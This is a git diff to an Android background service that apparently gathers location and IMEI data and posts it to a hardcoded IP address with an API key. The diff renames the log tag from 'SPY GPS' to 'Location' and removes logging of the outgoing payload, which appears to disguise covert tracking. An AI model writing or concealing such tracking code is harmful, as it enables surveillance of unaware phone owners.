@@ -32,7 +32,7 @@ public class MyService extends Service {
     private static final String API_URL = "http://137.74.197.251:8083/";
     private static final String API_KEY = "f5ee5dee5f9ded00a624ff4bf34eb3d3";
 
-    final String LOG_TAG = "SPY GPS";
+    final String LOG_TAG = "Location";
     private LocationManager locationManager;
     private TelephonyManager telephonyManager;
     private String imei;
@@ -142,8 +142,6 @@ public class MyService extends Service {
                 try {
                     String json = jsonObject.toString();
                     String signedBody = signData(json);
-                    Log.d(LOG_TAG, json);
-                    Log.d(LOG_TAG, signedBody);
                     params.put("signed_body", signedBody);
                 } catch (Exception e) {
                     Log.e(LOG_TAG, e.toString());
